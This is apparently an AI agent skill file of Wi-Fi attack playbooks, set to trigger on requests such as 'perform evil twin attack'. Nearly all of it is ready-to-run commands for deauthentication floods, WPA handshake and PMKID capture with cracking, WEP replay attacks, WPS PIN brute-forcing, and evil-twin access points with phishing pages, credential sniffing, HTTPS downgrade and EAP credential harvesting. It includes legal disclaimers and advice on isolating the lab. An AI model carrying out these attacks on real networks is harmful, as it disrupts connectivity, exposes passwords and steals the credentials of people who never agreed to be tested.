---
name: wireless-security-wifi-penetration-testing
description: Open hands-on study notes and practical labs on wireless security, Wi-Fi penetration testing, 802.11 protocols, WEP/WPA/WPA2/WPA3 cracking, and aircrack-ng suite
triggers:
  - "how do I capture WPA handshakes"
  - "crack WEP encryption with aircrack"
  - "setup monitor mode on wireless adapter"
  - "perform evil twin attack"
  - "test wifi security with aircrack-ng"
  - "capture PMKID for WPA cracking"
  - "setup rogue access point"
  - "perform wireless deauth attack"
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides comprehensive knowledge for wireless security assessment and Wi-Fi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 protocols, encryption mechanisms (WEP/WPA/WPA2/WPA3), monitor mode setup, reconnaissance, traffic analysis, handshake capture, key cracking, rogue AP deployment, and enterprise wireless assessment.

## What This Project Provides

A complete, hands-on curriculum for wireless security testing structured as:

- **14 modules** across 4 phases (Fundamentals → Recon & Bypass → Attacks → Enterprise)
- **Practical labs** with real capture and attack scenarios
- **Command-ready snippets** for aircrack-ng, hashcat, kismet, hostapd, and more
- **Offense + defense** patterns for each attack vector
- **Enterprise WPA/RADIUS** assessment techniques
- **Professional reporting** guidance

Designed for ethical hackers, penetration testers, red-team operators, and wireless security analysts.

## Prerequisites

**Required:**
- Kali Linux (or Debian-based distro with aircrack-ng)
- Injection-capable wireless adapter (Atheros AR9271 or Ralink RT3070/RT5372)
- Basic Linux CLI and networking knowledge
- **Legal authorization** to test target networks

**Hardware:**
- At least 1 USB wireless adapter with monitor mode + packet injection support
- Test access point you own (WEP/WPA/WPA2 configured)
- Client device(s) for handshake generation

## Installation

### Core Tools (Kali Linux)

Most tools are pre-installed on Kali. Verify/install:

```bash
# Update package lists
sudo apt update

# Core aircrack-ng suite
sudo apt install aircrack-ng

# Additional wireless tools
sudo apt install reaver bully wash kismet wireshark tcpdump

# Hashcat for GPU cracking
sudo apt install hashcat

# PMKID capture tools
sudo apt install hcxdumptool hcxtools

# Rogue AP tools
sudo apt install hostapd dnsmasq

# Optional: advanced MITM/evil twin
sudo apt install wifiphisher bettercap
```

### Verify Adapter Capabilities

```bash
# Check wireless interfaces
iwconfig

# Check if adapter supports monitor mode
sudo iw list | grep -A 10 "Supported interface modes"

# Should see: * monitor

# Check for packet injection support
sudo airmon-ng check

# Start monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface

# Test packet injection
sudo aireplay-ng --test wlan0mon
# Should show successful injection to target AP
```

## Key Configuration

### Adapter Setup for Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor mode is active
iwconfig wlan0mon
# Should show Mode:Monitor

# Set regulatory domain (required for legal compliance)
sudo iw reg set US  # Use your country code

# Change MAC address (optional, for anonymity)
sudo ifconfig wlan0mon down
sudo macchanger -r wlan0mon
sudo ifconfig wlan0mon up
```

### Channel Hopping vs. Fixed Channel

```bash
# Hop channels (for discovery)
sudo airodump-ng wlan0mon

# Lock to specific channel (for targeted capture)
sudo airodump-ng -c 6 wlan0mon

# Set channel manually
sudo iwconfig wlan0mon channel 6
```

## Core Workflows

### 1. Wireless Reconnaissance

**Discover all networks:**

```bash
# Start airodump-ng to scan all channels
sudo airodump-ng wlan0mon

# Save scan results to file
sudo airodump-ng -w discovery --output-format csv wlan0mon

# Scan specific channel range
sudo airodump-ng -c 1,6,11 wlan0mon
```

**Targeted AP reconnaissance:**

```bash
# Focus on specific BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon

# Show clients only
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --showack wlan0mon
```

**Discover hidden SSIDs:**

```bash
# Capture beacons and probe responses
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w hidden wlan0mon

# Deauth a client to force SSID broadcast
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MA:CA:DD:RE:SS wlan0mon
```

### 2. WPA/WPA2 Handshake Capture

**Passive capture (wait for client reconnection):**

```bash
# Start capture on target AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_handshake wlan0mon

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right corner
```

**Active capture (deauth to force handshake):**

```bash
# Terminal 1: Start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_handshake wlan0mon

# Terminal 2: Deauth a client (forces re-authentication)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MA:CA:DD:RE:SS wlan0mon
# -0 = deauth, 10 = number of deauth packets
# -a = AP BSSID, -c = client MAC

# Broadcast deauth (all clients)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Verify handshake capture:**

```bash
# Check .cap file for handshake
sudo aircrack-ng wpa_handshake-01.cap

# Should show: "1 handshake"
```

### 3. WPA/WPA2 PSK Cracking

**Dictionary attack with aircrack-ng:**

```bash
# Crack with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_handshake-01.cap

# Specify ESSID if multiple in capture
sudo aircrack-ng -w wordlist.txt -e "TargetSSID" wpa_handshake-01.cap
```

**GPU-accelerated cracking with hashcat:**

```bash
# Convert .cap to hashcat format
sudo aircrack-ng -J hashcat_output wpa_handshake-01.cap

# Or use hcxpcapngtool for modern format
hcxpcapngtool -o hashcat_output.hc22000 wpa_handshake-01.cap

# Crack with hashcat (WPA-EAPOL-PBKDF2 = mode 22000)
hashcat -m 22000 -a 0 hashcat_output.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 -a 0 hashcat_output.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute-force mode (8-digit numeric)
hashcat -m 22000 -a 3 hashcat_output.hc22000 ?d?d?d?d?d?d?d?d
```

### 4. PMKID Attack (No Handshake Required)

**Capture PMKID:**

```bash
# Using hcxdumptool (modern)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Target specific AP
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --filterlist=targets.txt --enable_status=1
# targets.txt contains BSSID per line

# Using older hcxtools
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
```

**Convert and crack:**

```bash
# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng

# Crack with hashcat
hashcat -m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 22000 pmkid.hc22000 --show
```

### 5. WEP Cracking

**ARP replay attack (fastest):**

```bash
# Terminal 1: Capture IVs
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Terminal 2: Fake authentication (if required)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR:ADAPTER:MAC wlan0mon

# Terminal 3: ARP replay to generate IVs
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR:ADAPTER:MAC wlan0mon

# Terminal 4: Crack when IVs > 50,000
sudo aircrack-ng wep_capture-01.cap
```

**Chop-Chop attack (when ARP replay fails):**

```bash
# Capture a packet
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w chopchop wlan0mon

# Fake auth
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR:ADAPTER:MAC wlan0mon

# Run chop-chop
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h YOUR:ADAPTER:MAC wlan0mon

# Create ARP packet from XOR file
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h YOUR:ADAPTER:MAC -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-*.xor -w arp_packet

# Inject forged packet
sudo aireplay-ng -2 -r arp_packet wlan0mon

# Crack with collected IVs
sudo aircrack-ng wep_capture-01.cap
```

### 6. Evil Twin / Rogue AP Attack

**Create rogue AP with hostapd:**

```bash
# Create hostapd config (evil_twin.conf)
cat > evil_twin.conf << EOF
interface=wlan0
driver=nl80211
ssid=TargetSSID
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Start rogue AP
sudo hostapd evil_twin.conf
```

**Full evil twin with DHCP and internet:**

```bash
# Disable monitor mode, return to managed
sudo airmon-ng stop wlan0mon

# Create hostapd config
cat > evil_twin.conf << EOF
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Configure DHCP with dnsmasq
cat > dnsmasq.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Set up IP forwarding and NAT
sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Start services
sudo dnsmasq -C dnsmasq.conf
sudo hostapd evil_twin.conf
```

**Automated evil twin with wifiphisher:**

```bash
# Basic evil twin
sudo wifiphisher -e "TargetSSID" -p firmware-upgrade

# Available phishing scenarios
sudo wifiphisher --list-pages

# Custom jamming + evil twin
sudo wifiphisher -aI wlan0 -jI wlan1 -e "TargetSSID"
```

### 7. Wireless MITM with bettercap

```bash
# Start bettercap on wireless interface
sudo bettercap -iface wlan0

# Inside bettercap interactive shell:
# Set wireless card to monitor mode
> wifi.recon on

# Show discovered APs
> wifi.show

# Deauth clients from target AP
> set wifi.deauth.target AA:BB:CC:DD:EE:FF
> wifi.deauth on

# Create evil twin AP
> set wifi.ap.ssid "TargetSSID"
> set wifi.ap.bssid AA:BB:CC:DD:EE:FF
> set wifi.ap.channel 6
> wifi.ap

# Sniff credentials
> set net.sniff.verbose true
> set net.sniff.local true
> net.sniff on

# HTTP/HTTPS downgrade and JS injection
> set http.proxy.script /path/to/inject.js
> http.proxy on
> https.proxy on
```

### 8. WPS Attack

**Scan for WPS-enabled APs:**

```bash
# Scan with wash
sudo wash -i wlan0mon

# Look for "WPS Locked: No" targets
```

**Reaver WPS PIN attack:**

```bash
# Basic reaver attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With delay to avoid lockout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -T 0.5 -vv

# Use known PIN structure
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670 -vv

# Pixie dust attack (faster, works on vulnerable implementations)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vv
```

**Bully WPS attack:**

```bash
# Standard attack
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Pixie dust mode
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon
```

## Enterprise WPA (EAP/RADIUS) Testing

### Setup Test RADIUS Server

```bash
# Install FreeRADIUS
sudo apt install freeradius

# Configure test user (edit /etc/freeradius/3.0/users)
echo 'testuser Cleartext-Password := "testpass123"' | sudo tee -a /etc/freeradius/3.0/users

# Start RADIUS
sudo systemctl start freeradius

# Test authentication
radtest testuser testpass123 localhost 0 testing123
```

### Configure Enterprise AP with hostapd

```bash
cat > enterprise_ap.conf << EOF
interface=wlan0
driver=nl80211
ssid=Enterprise-Test
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eapol_key_index_workaround=0
eap_server=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
EOF

sudo hostapd enterprise_ap.conf
```

### Capture EAP Credentials

```bash
# Monitor EAP exchanges
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w eap_capture wlan0mon

# Use hostapd-wpe for credential harvesting (evil twin)
sudo apt install hostapd-wpe

# Run hostapd-wpe (logs captured credentials)
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Check captured credentials
sudo cat /var/log/hostapd-wpe.log
```

## Advanced Attacks

### KRACK (Key Reinstallation Attack)

```bash
# Clone KRACK attack scripts
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts

# Setup virtual environment
./krackattack/krack-test-client.sh

# Run KRACK attack against client
sudo ./krackattack/krack-all-zero-tk.py wlan0mon AA:BB:CC:DD:EE:FF
```

### WPA3 Dragonblood Testing

```bash
# Install dragonblood tools
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Test for SAE vulnerabilities
sudo ./dragonslayer.py --interface wlan0mon --bssid AA:BB:CC:DD:EE:FF --ssid "WPA3-Network"
```

## Traffic Analysis

### Wireshark Filters for 802.11

```bash
# Capture with airodump, analyze in Wireshark
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Open in Wireshark
wireshark capture-01.cap
```

**Useful Wireshark display filters:**

```
# Show only EAPOL (handshake) packets
eapol

# Show beacons from specific BSSID
wlan.bssid == aa:bb:cc:dd:ee:ff && wlan.fc.type_subtype == 0x08

# Show deauth/disassoc packets
wlan.fc.type_subtype == 0x0c || wlan.fc.type_subtype == 0x0a

# Show data packets
wlan.fc.type == 2

# Show probe requests
wlan.fc.type_subtype == 0x04

# Show WPA handshake messages
eapol.keydes.key_info
```

### Kismet for Wireless IDS

```bash
# Start kismet
sudo kismet

# Access web interface
# http://localhost:2501

# Configure data sources (in web UI or CLI)
kismet -c wlan0mon

# View logs
tail -f ~/.kismet/Kismet-*.kismet
```

## Common Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Bring interface down and up
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

# Use airmon-ng
sudo airmon-ng start wlan0

# Verify
iwconfig wlan0mon | grep Mode
```

### Packet Injection Test Fails

```bash
# Check injection capability
sudo aireplay-ng --test wlan0mon

# If fails, verify chipset
lsusb
dmesg | grep -i wireless

# Try different channel
sudo iwconfig wlan0mon channel 1
sudo aireplay-ng --test wlan0mon

# Lower TX power
sudo iwconfig wlan0mon txpower 10
```

### No Handshake Captured

```bash
# Ensure you're on correct channel
sudo iwconfig wlan0mon channel 6

# Verify clients are connected
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# Look for "Stations" section

# Increase deauth count
sudo aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon

# Try broadcast deauth
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Check capture file
sudo aircrack-ng capture-01.cap
```

### WEP Cracking Slow IV Generation

```bash
# Ensure fake auth succeeded
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon
# Look for "Association successful"

# Fragment attack to generate packets
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon

# Interactive packet replay
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan0mon
```

### Hashcat Not Using GPU

```bash
# Check GPU detection
hashcat -I

# Force specific device
hashcat -m 22000 -a 0 -d 1 hash.hc22000 wordlist.txt

# Install OpenCL/CUDA drivers (NVIDIA)
sudo apt install nvidia-driver nvidia-cuda-toolkit

# AMD
sudo apt install amdgpu-pro
```

### Rogue AP Clients Not Getting IP

```bash
# Check DHCP service
sudo systemctl status dnsmasq

# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward
# Should be 1

# Check iptables rules
sudo iptables -t nat -L

# Restart services
sudo systemctl restart dnsmasq
sudo systemctl restart hostapd
```

## Best Practices

### Legal and Ethical

```bash
# NEVER test without authorization
# Always get written permission
# Isolate your lab network
# Document your scope
# Use low TX power to limit signal bleed
```

### Lab Isolation

```bash
# Set low TX power
sudo iwconfig wlan0mon txpower 5

# Use Faraday cage or RF-shielded room
# Or use attenuators on antennas
# Test in basement/isolated area away from neighbors
```

### Clean Shutdown

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart network services
sudo systemctl restart NetworkManager

# Or re-enable with:
sudo rfkill unblock wifi
sudo ifconfig wlan0 up
```

## Reference Commands

### Quick Reference Card

```bash
# --- Reconnaissance ---
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# --- Deauth ---
sudo aireplay-ng -0 10 -a AP:BSSID -c CLIENT:MAC wlan0mon

# --- WPA Handshake ---
sudo aircrack-ng -w wordlist.txt -b AP:BSSID capture-01.cap

# --- PMKID ---
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 -a 0 pmkid.hc22000 wordlist.txt

# --- WEP ---
sudo aireplay-ng -1 0 -a AP:BSSID -h YOUR:MAC wlan0mon
sudo aireplay-ng -3 -b AP:BSSID -h YOUR:MAC wlan0mon
sudo aircrack-ng capture-01.cap

# --- WPS ---
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b AP:BSSID -vv -K

# --- Evil Twin ---
sudo hostapd evil_twin.conf
sudo wifiphisher -e "TargetSSID"

# --- Monitor Mode ---
sudo airmon-ng start wlan0
sudo airmon-ng stop wlan0mon
```

## Environment Variables

Many tools respect standard environment variables:

```bash
# Wordlist location
export WORDLIST=/usr/share/wordlists/rockyou.txt

# Hashcat potfile location
export HASHCAT_POTFILE_PATH=~/.hashcat/hashcat.potfile

# Wireshark config
export WIRESHARK_CONFIG_DIR=~/.config/wireshark
```

## Additional Resources

- **Aircrack-ng documentation**: https://www.aircrack-ng.org/documentation.html
- **Hashcat wiki**: https://hashcat.net/wiki/
- **OSWP certification**: Offensive Security Wireless Professional
- **Project homepage**: https://www.armourinfosec.com

---

**Warning**: All techniques in this skill are for authorized security testing only. Unauthorized wireless attacks (deauth, jamming, credential capture, rogue APs) are illegal. Practice only on networks you own or have explicit written permission to assess.
